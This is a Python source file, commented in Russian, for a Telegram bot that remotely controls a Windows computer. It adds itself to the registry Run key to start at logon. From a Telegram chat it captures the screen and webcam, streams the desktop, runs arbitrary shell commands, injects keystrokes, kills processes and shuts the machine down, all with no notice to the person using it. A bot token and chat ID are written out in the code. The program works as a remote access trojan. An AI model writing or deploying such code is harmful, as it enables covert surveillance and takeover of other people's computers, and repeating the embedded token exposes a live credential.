import telebot
import pyautogui
import cv2
import os
import sys
import winreg
import time
import threading
import numpy as np
import psutil
import subprocess
import ctypes
import keyboard
import pygetwindow as gw
from PIL import Image

# Конфигурация (ЗАМЕНИТЕ НА СВОИ ДАННЫЕ)
BOT_TOKEN = "7911812987:AAHpm_K4N2DKRBKkDaNOCMkXCcY1MIINwgc"
CHAT_ID = "855423845"  # Ваш ID в Telegram
# --------------------------------------

bot = telebot.TeleBot(BOT_TOKEN)
streaming = False
last_stream_message_id = None
stream_quality = 25
stream_interval = 1

# ====================== ОСНОВНЫЕ ФУНКЦИИ ====================== #

def add_to_autostart():
    """Добавление программы в автозагрузку Windows"""
    try:
        app_path = os.path.abspath(sys.argv[0])
        key_name = "RemoteControlBot"
        
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        ) as key:
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, f'"{sys.executable}" "{app_path}"')
        return True
    except Exception as e:
        print(f"Ошибка автозагрузки: {e}")
        return False

# ... (функции take_screenshot и take_webcam_photo остаются без изменений) ...

# ====================== НОВЫЙ ФУНКЦИОНАЛ ====================== #

def take_screenshot(quality=100):
    """Создание скриншота экрана с настройкой качества"""
    try:
        screenshot = pyautogui.screenshot()
        screenshot_path = os.path.join(os.getenv('TEMP'), 'screenshot.jpg')
        
        # Конвертируем в RGB, если нужно
        if screenshot.mode != 'RGB':
            screenshot = screenshot.convert('RGB')
            
        # Сохраняем с указанным качеством
        screenshot.save(screenshot_path, 'JPEG', quality=quality)
        return screenshot_path
    except Exception as e:
        print(f"Ошибка скриншота: {e}")
        return None

def take_webcam_photo():
    """Создание снимка с веб-камеры"""
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
            
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            photo_path = os.path.join(os.getenv('TEMP'), 'webcam.jpg')
            cv2.imwrite(photo_path, frame)
            return photo_path
    except Exception as e:
        print(f"Ошибка камеры: {e}")
    return None

def get_system_info():
    """Получение информации о системе"""
    try:
        # Информация о процессоре
        cpu_percent = psutil.cpu_percent(interval=1)
        cpu_freq = psutil.cpu_freq().current if psutil.cpu_freq() else "N/A"
        cpu_cores = psutil.cpu_count(logical=False)
        cpu_threads = psutil.cpu_count(logical=True)
        
        # Информация о памяти
        mem = psutil.virtual_memory()
        mem_total = mem.total // (1024**3)
        mem_used = mem.used // (1024**3)
        mem_percent = mem.percent
        
        # Информация о диске
        disk = psutil.disk_usage('/')
        disk_total = disk.total // (1024**3)
        disk_used = disk.used // (1024**3)
        disk_percent = disk.percent
        
        # Информация о сети
        net = psutil.net_io_counters()
        net_sent = net.bytes_sent // (1024**2)
        net_recv = net.bytes_recv // (1024**2)
        
        # Информация о системе
        boot_time = psutil.boot_time()
        uptime = time.time() - boot_time
        hours, remainder = divmod(uptime, 3600)
        minutes, seconds = divmod(remainder, 60)
        
        info = (
            f"💻 <b>Информация о системе</b>\n\n"
            f"<b>Процессор:</b>\n"
            f"• Загрузка: {cpu_percent}%\n"
            f"• Частота: {cpu_freq} МГц\n"
            f"• Ядра: {cpu_cores} физических, {cpu_threads} логических\n\n"
            f"<b>Память:</b>\n"
            f"• Использовано: {mem_used} ГБ из {mem_total} ГБ ({mem_percent}%)\n\n"
            f"<b>Диск (C:):</b>\n"
            f"• Использовано: {disk_used} ГБ из {disk_total} ГБ ({disk_percent}%)\n\n"
            f"<b>Сеть:</b>\n"
            f"• Отправлено: {net_sent} МБ\n"
            f"• Получено: {net_recv} МБ\n\n"
            f"<b>Время работы:</b>\n"
            f"• {int(hours)} ч. {int(minutes)} мин. {int(seconds)} сек."
        )
        return info
    except Exception as e:
        return f"❌ Ошибка получения информации: {str(e)}"

def list_processes():
    """Список запущенных процессов"""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'memory_percent']):
            try:
                processes.append(proc.info)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        
        # Сортируем по использованию памяти
        processes = sorted(processes, key=lambda p: p['memory_percent'], reverse=True)[:15]
        
        result = "🔄 <b>Топ-15 процессов по памяти:</b>\n\n"
        for i, proc in enumerate(processes):
            result += f"{i+1}. {proc['name']} (PID: {proc['pid']}) - {proc['memory_percent']:.1f}%\n"
        
        return result
    except Exception as e:
        return f"❌ Ошибка получения процессов: {str(e)}"

def kill_process(pid):
    """Завершение процесса по PID"""
    try:
        pid = int(pid)
        process = psutil.Process(pid)
        process.terminate()
        return f"✅ Процесс {pid} ({process.name()}) завершен"
    except (ValueError, psutil.NoSuchProcess, psutil.AccessDenied) as e:
        return f"❌ Ошибка: {str(e)}"

def get_active_window():
    """Получение информации об активном окне"""
    try:
        window = gw.getActiveWindow()
        if window:
            return f"🖥️ <b>Активное окно:</b>\n\n{window.title}"
        return "❌ Не удалось определить активное окно"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"

def lock_workstation():
    """Блокировка компьютера"""
    try:
        ctypes.windll.user32.LockWorkStation()
        return "🔒 Компьютер заблокирован"
    except Exception as e:
        return f"❌ Ошибка блокировки: {str(e)}"

def shutdown_computer(delay=30):
    """Выключение компьютера"""
    try:
        os.system(f"shutdown /s /t {delay}")
        return f"⏳ Компьютер выключится через {delay} секунд"
    except Exception as e:
        return f"❌ Ошибка выключения: {str(e)}"

def cancel_shutdown():
    """Отмена выключения компьютера"""
    try:
        os.system("shutdown /a")
        return "✅ Выключение отменено"
    except Exception as e:
        return f"❌ Ошибка отмены выключения: {str(e)}"

def execute_command(cmd):
    """Выполнение команды в CMD"""
    try:
        result = subprocess.check_output(
            cmd, 
            shell=True, 
            stderr=subprocess.STDOUT, 
            text=True,
            timeout=10
        )
        return f"✅ Результат выполнения:\n<code>{result[:3000]}</code>" if result else "✅ Команда выполнена"
    except subprocess.CalledProcessError as e:
        return f"❌ Ошибка выполнения:\n<code>{e.output[:3000]}</code>"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"

def send_keys(keys):
    """Отправка клавиш на компьютер"""
    try:
        keyboard.write(keys)
        return f"⌨️ Отправлены клавиши: {keys}"
    except Exception as e:
        return f"❌ Ошибка отправки клавиш: {str(e)}"

def screen_stream(chat_id):
    """Поток для трансляции экрана с заменой предыдущего кадра"""
    global streaming, stream_quality, stream_interval, last_stream_message_id
    
    frame_count = 0
    last_update = time.time()
    
    while streaming:
        try:
            start_time = time.time()
            
            # Создаем скриншот
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            
            # Ресайз и оптимизация
            height, width = frame.shape[:2]
            new_width = int(width * stream_quality / 100)
            new_height = int(height * stream_quality / 100)
            small_frame = cv2.resize(frame, (new_width, new_height))
            
            # Сохраняем временный файл
            stream_path = os.path.join(os.getenv('TEMP'), 'stream.jpg')
            cv2.imwrite(stream_path, small_frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
            
            # Отправляем/обновляем сообщение
            with open(stream_path, 'rb') as photo:
                if frame_count == 0:
                    # Первый кадр - редактируем начальное сообщение
                    bot.edit_message_media(
                        chat_id=chat_id,
                        message_id=last_stream_message_id,
                        media=telebot.types.InputMediaPhoto(photo),
                        reply_markup=None
                    )
                    bot.edit_message_caption(
                        chat_id=chat_id,
                        message_id=last_stream_message_id,
                        caption="🟢 Стрим запущен | Качество: {}% | Интервал: {}с".format(
                            stream_quality, stream_interval
                        )
                    )
                else:
                    # Последующие кадры - редактируем существующее
                    try:
                        bot.edit_message_media(
                            chat_id=chat_id,
                            message_id=last_stream_message_id,
                            media=telebot.types.InputMediaPhoto(photo)
                        )
                    except telebot.apihelper.ApiTelegramException as e:
                        if "message is not modified" in str(e):
                            pass  # Игнорируем если контент не изменился
                        else:
                            raise
            
            # Удаляем временный файл
            os.remove(stream_path)
            
            # Обновляем статус каждые 10 секунд
            if time.time() - last_update > 10:
                fps = frame_count / 10
                bot.edit_message_caption(
                    chat_id=chat_id,
                    message_id=last_stream_message_id,
                    caption="🟢 Стрим | FPS: {:.1f} | Качество: {}% | Интервал: {}с".format(
                        fps, stream_quality, stream_interval
                    )
                )
                frame_count = 0
                last_update = time.time()
            
            frame_count += 1
            
            # Выдерживаем интервал
            elapsed = time.time() - start_time
            sleep_time = max(0.1, stream_interval - elapsed)
            time.sleep(sleep_time)
            
        except Exception as e:
            print(f"Ошибка стрима: {e}")
            time.sleep(1)
    
    # Отправляем финальное сообщение
    bot.edit_message_caption(
        chat_id=chat_id,
        message_id=last_stream_message_id,
        caption="🔴 Стрим остановлен"
    )

# ====================== ОБРАБОТЧИКИ КОМАНД ====================== #

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if str(message.chat.id) != CHAT_ID:
        return
    help_text = """
📟 <b>Команды удалённого управления:</b>

🖼️ <b>Медиа:</b>
/screen - скриншот экрана
/webcam - фото с камеры
/stream_start - начать трансляцию экрана
/stream_stop - остановить трансляцию
/stream_quality [1-100] - качество стрима
/stream_interval [секунды] - интервал кадров

💻 <b>Система:</b>
/sysinfo - информация о системе
/processes - список процессов
/kill [PID] - завершить процесс
/window - активное окно
/lock - заблокировать компьютер
/shutdown [секунды] - выключить компьютер
/cancel_shutdown - отменить выключение

⚙️ <b>Управление:</b>
/cmd [команда] - выполнить команду CMD
/keys [текст] - отправить клавиши
/press [клавиша] - нажать клавишу (например: alt+f4)
"""
    bot.reply_to(message, help_text, parse_mode='HTML')

@bot.message_handler(commands=['sysinfo'])
def send_system_info(message):
    if str(message.chat.id) != CHAT_ID:
        return
    info = get_system_info()
    bot.reply_to(message, info, parse_mode='HTML')

@bot.message_handler(commands=['processes'])
def send_process_list(message):
    if str(message.chat.id) != CHAT_ID:
        return
    processes = list_processes()
    bot.reply_to(message, processes, parse_mode='HTML')

@bot.message_handler(commands=['kill'])
def kill_selected_process(message):
    if str(message.chat.id) != CHAT_ID:
        return
        
    try:
        pid = message.text.split()[1]
        result = kill_process(pid)
        bot.reply_to(message, result, parse_mode='HTML')
    except IndexError:
        bot.reply_to(message, "❌ Укажите PID процесса: /kill [PID]")

@bot.message_handler(commands=['window'])
def send_active_window(message):
    if str(message.chat.id) != CHAT_ID:
        return
    window_info = get_active_window()
    bot.reply_to(message, window_info, parse_mode='HTML')

@bot.message_handler(commands=['lock'])
def lock_system(message):
    if str(message.chat.id) != CHAT_ID:
        return
    result = lock_workstation()
    bot.reply_to(message, result)

@bot.message_handler(commands=['shutdown'])
def shutdown_system(message):
    if str(message.chat.id) != CHAT_ID:
        return
        
    try:
        delay = int(message.text.split()[1]) if len(message.text.split()) > 1 else 30
        result = shutdown_computer(delay)
        bot.reply_to(message, result)
    except ValueError:
        bot.reply_to(message, "❌ Укажите время в секундах: /shutdown [секунды]")

@bot.message_handler(commands=['cancel_shutdown'])
def cancel_system_shutdown(message):
    if str(message.chat.id) != CHAT_ID:
        return
    result = cancel_shutdown()
    bot.reply_to(message, result)

@bot.message_handler(commands=['cmd'])
def execute_system_command(message):
    if str(message.chat.id) != CHAT_ID:
        return
        
    try:
        command = message.text[5:]
        if not command:
            bot.reply_to(message, "❌ Укажите команду: /cmd [команда]")
            return
            
        result = execute_command(command)
        bot.reply_to(message, result, parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}")

@bot.message_handler(commands=['keys'])
def send_keyboard_keys(message):
    if str(message.chat.id) != CHAT_ID:
        return
        
    try:
        keys = message.text[6:]
        if not keys:
            bot.reply_to(message, "❌ Укажите текст: /keys [текст]")
            return
            
        result = send_keys(keys)
        bot.reply_to(message, result)
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}")

@bot.message_handler(commands=['press'])
def press_special_key(message):
    if str(message.chat.id) != CHAT_ID:
        return
        
    try:
        key = message.text[7:]
        if not key:
            bot.reply_to(message, "❌ Укажите клавишу: /press [клавиша]")
            return
            
        keyboard.press_and_release(key)
        bot.reply_to(message, f"✅ Нажата клавиша: {key}")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}")

@bot.message_handler(commands=['screen'])
def send_screenshot(message):
    if str(message.chat.id) != CHAT_ID:
        return
        
    bot.reply_to(message, "📸 Делаю скриншот...")
    screenshot_path = take_screenshot()
    
    if screenshot_path and os.path.exists(screenshot_path):
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove(screenshot_path)
    else:
        bot.reply_to(message, "❌ Ошибка создания скриншота")

@bot.message_handler(commands=['webcam'])
def send_webcam_photo(message):
    if str(message.chat.id) != CHAT_ID:
        return
        
    bot.reply_to(message, "📷 Фотографирую...")
    photo_path = take_webcam_photo()
    
    if photo_path and os.path.exists(photo_path):
        with open(photo_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove(photo_path)
    else:
        bot.reply_to(message, "❌ Ошибка доступа к камере")

@bot.message_handler(commands=['stream_start'])
def start_stream(message):
    global streaming, last_stream_message_id
    
    if str(message.chat.id) != CHAT_ID:
        return
        
    if streaming:
        bot.reply_to(message, "ℹ️ Стрим уже запущен")
        return
        
    # Отправляем начальное сообщение и запоминаем его ID
    status_msg = bot.reply_to(message, "🟡 Запускаю стрим экрана...")
    last_stream_message_id = status_msg.message_id
    
    streaming = True
    stream_thread = threading.Thread(target=screen_stream, args=(message.chat.id,))
    stream_thread.daemon = True
    stream_thread.start()

@bot.message_handler(commands=['stream_stop'])
def stop_stream(message):
    global streaming
    
    if str(message.chat.id) != CHAT_ID:
        return
        
    if streaming:
        streaming = False
        bot.reply_to(message, "🛑 Останавливаю стрим...")
    else:
        bot.reply_to(message, "ℹ️ Стрим не активен")

@bot.message_handler(commands=['stream_quality'])
def set_stream_quality(message):
    global stream_quality
    
    if str(message.chat.id) != CHAT_ID:
        return
        
    try:
        quality = int(message.text.split()[1])
        if 1 <= quality <= 100:
            stream_quality = quality
            bot.reply_to(message, f"✅ Качество стрима установлено: {quality}%")
        else:
            bot.reply_to(message, "❌ Укажите качество от 1 до 100")
    except:
        bot.reply_to(message, "❌ Используйте: /stream_quality [1-100]")

@bot.message_handler(commands=['stream_interval'])
def set_stream_interval(message):
    global stream_interval
    
    if str(message.chat.id) != CHAT_ID:
        return
        
    try:
        interval = float(message.text.split()[1])
        if 0.3 <= interval <= 10:
            stream_interval = interval
            bot.reply_to(message, f"✅ Интервал стрима установлен: {interval} секунд")
        else:
            bot.reply_to(message, "❌ Укажите интервал от 0.3 до 10 секунд")
    except:
        bot.reply_to(message, "❌ Используйте: /stream_interval [секунды]")

@bot.message_handler(commands=['lock'])
def lock_pc(message):
    if str(message.chat.id) != CHAT_ID:
        return
    # Блокировка компьютера
    bot.reply_to(message, "Устройство заблокировано")
    os.system('rundll32.exe user32.dll,LockWorkStation')

def run_bot():
    """Запуск бота с обработкой ошибок"""
    while True:
        try:
            bot.polling(none_stop=True, timeout=30)
        except Exception as e:
            print(f"Ошибка подключения: {e}")
            time.sleep(10)

# ====================== ЗАПУСК ПРОГРАММЫ ====================== #

if __name__ == "__main__":
    # Добавление в автозагрузку при первом запуске
    if not getattr(sys, 'frozen', False):
        add_to_autostart()
    
    # Запуск бота в отдельном потоке
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    # Бесконечный цикл для работы программы
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        streaming = False
        sys.exit()